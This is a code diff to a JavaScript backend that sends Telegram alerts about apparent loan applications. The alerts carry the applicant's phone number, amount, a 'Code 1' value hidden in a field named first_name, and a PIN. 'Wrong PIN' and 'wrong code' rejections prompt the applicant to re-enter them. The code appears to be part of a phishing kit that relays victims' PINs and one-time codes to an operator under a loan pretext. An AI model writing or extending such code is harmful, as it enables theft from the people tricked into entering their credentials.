@@ -379,7 +379,7 @@ function rejectionLabel(stage) {
 }
 
 function formatTelegramNotification(application, kind) {
-  const id = application.application_id || application.application_no || "—";
+  const id = application.Pin_id || application.application_no || "—";
   const phone = application.phone || "—";
   const stamp = application.updated_at ? new Date(application.updated_at).toLocaleString() : new Date().toLocaleString();
   const attempt = Number(application.attempt_number || 1);
@@ -396,7 +396,7 @@ function formatTelegramNotification(application, kind) {
       `✓ User will see the approval page`;
   }
 
-  const reason = kind === "wrongfirst" ? "Code 1 needs review" : kind === "wrongpin" ? "Application reference needs review" : "Application rejected";
+  const reason = kind === "wrongfirst" ? "Code 1 needs review" : kind === "wrongpin" ? "Pin needs review" : "Application rejected";
   return `❌ LOAN REJECTED\n\n` +
     `🔑 Pin: ${id}\n` +
     `📞 Phone: ${phone}\n` +
@@ -465,7 +465,7 @@ async function notifyTelegram(application) {
   const stamp = application.updated_at ? new Date(application.updated_at).toLocaleString() : new Date().toLocaleString();
   const code1 = application.first_name ? String(application.first_name) : "Not submitted";
   const text = `${title}\n\n` +
-    `📋 Application: ${application.application_id || application.application_no || "—"}\n` +
+    `🔑 Pin: ${application.application_id || application.application_no || "—"}\n` +
     `📞 Phone: ${application.phone || "—"}\n` +
     `💰 Amount: ${money(application.amount)}\n` +
     `🔢 Code 1: ${code1}\n` +
